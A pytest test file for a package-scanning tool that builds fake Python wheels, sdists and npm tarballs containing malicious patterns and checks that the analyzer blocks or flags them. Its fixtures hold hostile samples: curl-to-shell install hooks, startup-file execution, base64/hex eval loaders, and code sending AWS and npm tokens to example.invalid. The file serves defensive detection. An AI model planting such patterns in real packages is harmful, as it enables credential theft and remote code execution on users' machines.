from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
import zipfile

from ca9.analyzers.package_code import analyze_package_snapshots
from ca9.artifacts.fetch import ArtifactScanConfig, collect_artifact_snapshots
from ca9.core.models import Artifact, Inventory, Package, SourceEvidence


def test_package_code_analyzer_blocks_pth_startup_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("bad.pth", "import os; os.system('curl https://example.invalid/payload')\n")

    findings = _analyze_archive(tmp_path, wheel)

    assert findings[0].signal_type == "python-startup-pth-exec"
    assert findings[0].metadata["action"] == "block"
    assert findings[0].evidence[0].metadata["file_path"] == "bad.pth"


def test_package_code_analyzer_blocks_setup_install_execution(tmp_path):
    sdist = tmp_path / "bad-1.0.0.tar.gz"
    with tarfile.open(sdist, "w:gz") as tf:
        payload = b"import subprocess\nsubprocess.run(['sh', '-c', 'echo bad'])\n"
        info = tarfile.TarInfo("bad-1.0.0/setup.py")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

    findings = _analyze_archive(tmp_path, sdist, kind="sdist")

    assert findings[0].signal_type == "setup-install-exec"
    assert findings[0].metadata["action"] == "block"
    assert findings[0].evidence[0].metadata["file_path"] == "bad-1.0.0/setup.py"


def test_package_code_analyzer_blocks_encoded_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr(
            "bad/loader.py",
            "import base64\npayload = base64.b64decode('cHJpbnQoMSk=')\nexec(payload)\n",
        )

    findings = _analyze_archive(tmp_path, wheel)

    assert findings[0].signal_type == "encoded-execution"
    assert findings[0].metadata["action"] == "block"
    assert findings[0].evidence[0].metadata["line"] == 2


def test_package_code_analyzer_blocks_sitecustomize_startup_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("sitecustomize.py", "import subprocess\nsubprocess.Popen(['sh'])\n")

    findings = _analyze_archive(tmp_path, wheel)

    assert findings[0].signal_type == "python-startup-customize-exec"
    assert findings[0].metadata["action"] == "block"


def test_package_code_analyzer_blocks_credential_network_exfiltration(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr(
            "bad/exfil.py",
            "import os, requests\n"
            "token = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
            "requests.post('https://example.invalid/collect', data=token)\n",
        )

    findings = _analyze_archive(tmp_path, wheel)

    assert any(finding.signal_type == "credential-network-exfiltration" for finding in findings)


def test_package_code_analyzer_blocks_import_time_risky_behavior(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("bad/__init__.py", "import os\nos.system('touch /tmp/bad')\n")

    findings = _analyze_archive(tmp_path, wheel)

    assert any(finding.signal_type == "import-time-risky-behavior" for finding in findings)


def test_package_code_analyzer_investigates_silent_process_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr(
            "bad/worker.py",
            "import subprocess\ndef run():\n    return subprocess.check_output(['id'])\n",
        )

    findings = _analyze_archive(tmp_path, wheel)

    finding = next(item for item in findings if item.signal_type == "silent-process-execution")
    assert finding.metadata["action"] == "investigate"


def test_package_code_analyzer_ignores_benign_package(tmp_path):
    wheel = tmp_path / "benign-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("benign/__init__.py", "VALUE = 1\n")

    findings = _analyze_archive(tmp_path, wheel, package_name="benign")

    assert findings == []


def test_npm_analyzer_blocks_install_hook_exec(tmp_path):
    tgz = tmp_path / "bad-1.0.0.tgz"
    _write_npm_tgz(
        tgz,
        {
            "package/package.json": json.dumps(
                {
                    "name": "bad",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl https://example.invalid/p | sh"},
                }
            )
        },
    )

    # Use a real npm sha512 SRI integrity so this also exercises hash verification.
    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball", integrity=_npm_integrity(tgz))

    finding = next(f for f in findings if f.signal_type == "npm-install-script-exec")
    assert finding.metadata["action"] == "block"
    assert finding.evidence[0].metadata["file_path"] == "package/package.json"


def test_npm_analyzer_investigates_plain_install_hook(tmp_path):
    tgz = tmp_path / "bad-1.0.0.tgz"
    _write_npm_tgz(
        tgz,
        {
            "package/package.json": json.dumps(
                {
                    "name": "bad",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node ./scripts/build.js"},
                }
            )
        },
    )

    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")

    assert any(f.signal_type == "npm-install-script" for f in findings)
    finding = next(f for f in findings if f.signal_type == "npm-install-script")
    assert finding.metadata["action"] == "investigate"
    assert not any(f.signal_type == "npm-install-script-exec" for f in findings)


def test_npm_analyzer_blocks_encoded_execution(tmp_path):
    tgz = tmp_path / "bad-1.0.0.tgz"
    _write_npm_tgz(
        tgz,
        {
            "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
            "package/index.js": (
                "const p = Buffer.from('cHJpbnQoMSk=', 'base64').toString();\neval(p);\n"
            ),
        },
    )

    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")

    finding = next(f for f in findings if f.signal_type == "npm-encoded-execution")
    assert finding.metadata["action"] == "block"


def test_npm_analyzer_blocks_hex_encoded_execution(tmp_path):
    tgz = tmp_path / "bad-1.0.0.tgz"
    _write_npm_tgz(
        tgz,
        {
            "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
            "package/index.js": (
                "const p = Buffer.from('70726f636573732e657869742829', 'hex').toString();\n"
                "eval(p);\n"
            ),
        },
    )

    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")

    finding = next(f for f in findings if f.signal_type == "npm-encoded-execution")
    assert finding.metadata["action"] == "block"


def test_npm_analyzer_blocks_credential_exfiltration(tmp_path):
    tgz = tmp_path / "bad-1.0.0.tgz"
    _write_npm_tgz(
        tgz,
        {
            "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
            "package/index.js": (
                "const t = process.env.NPM_TOKEN;\n"
                "require('https').request('https://example.invalid', () => {}).end(t);\n"
            ),
        },
    )

    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")

    assert any(f.signal_type == "npm-credential-exfiltration" for f in findings)


def test_npm_analyzer_ignores_benign_package(tmp_path):
    tgz = tmp_path / "benign-1.0.0.tgz"
    _write_npm_tgz(
        tgz,
        {
            "package/package.json": json.dumps(
                {"name": "benign", "version": "1.0.0", "scripts": {"test": "jest"}}
            ),
            "package/index.js": "module.exports = 42;\n",
        },
    )

    findings = _analyze_archive(tmp_path, tgz, package_name="benign", kind="npm-tarball")

    assert findings == []


def test_npm_analyzer_ignores_package_json_in_python_sdist(tmp_path):
    sdist = tmp_path / "py-with-assets-1.0.0.tar.gz"
    with tarfile.open(sdist, "w:gz") as tf:
        payload = json.dumps(
            {"scripts": {"postinstall": "curl https://example.invalid/p | sh"}}
        ).encode()
        info = tarfile.TarInfo("py-with-assets-1.0.0/vendor/package.json")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

    findings = _analyze_archive(
        tmp_path,
        sdist,
        package_name="py-with-assets",
        kind="sdist",
    )

    assert not any(f.signal_type.startswith("npm-") for f in findings)


def _write_npm_tgz(path, files: dict[str, str]):
    with tarfile.open(path, "w:gz") as tf:
        for rel, content in files.items():
            payload = content.encode()
            info = tarfile.TarInfo(rel)
            info.size = len(payload)
            tf.addfile(info, io.BytesIO(payload))


def test_verify_hash_supports_npm_sri(tmp_path):
    from ca9.artifacts.fetch import _verify_hash

    blob = tmp_path / "blob"
    blob.write_bytes(b"hello world")
    good = "sha512-" + base64.b64encode(hashlib.sha512(b"hello world").digest()).decode("ascii")
    bad = "sha512-" + base64.b64encode(hashlib.sha512(b"tampered").digest()).decode("ascii")
    assert _verify_hash(blob, good)[0] is True
    assert _verify_hash(blob, bad)[0] is False


def _npm_integrity(path) -> str:
    digest = hashlib.sha512()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return "sha512-" + base64.b64encode(digest.digest()).decode("ascii")


def _analyze_archive(
    tmp_path,
    archive_path,
    *,
    package_name: str = "bad",
    kind: str = "wheel",
    integrity: str | None = None,
):
    evidence = SourceEvidence(source="test", path=str(archive_path), reader="test")
    package = Package(
        name=package_name,
        version="1.0.0",
        dependency_kind="direct",
        artifacts=(
            Artifact(
                kind=kind,
                url=archive_path.as_uri(),
                hash=integrity or f"sha256:{_sha256(archive_path)}",
                evidence=(evidence,),
            ),
        ),
        evidence=(evidence,),
    )
    inventory = Inventory(repo_path=str(tmp_path), packages=(package,))
    result = collect_artifact_snapshots(
        inventory,
        ArtifactScanConfig(cache_dir=tmp_path / "cache"),
    )
    assert not result.findings
    return analyze_package_snapshots(result.snapshots)


def _sha256(path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()
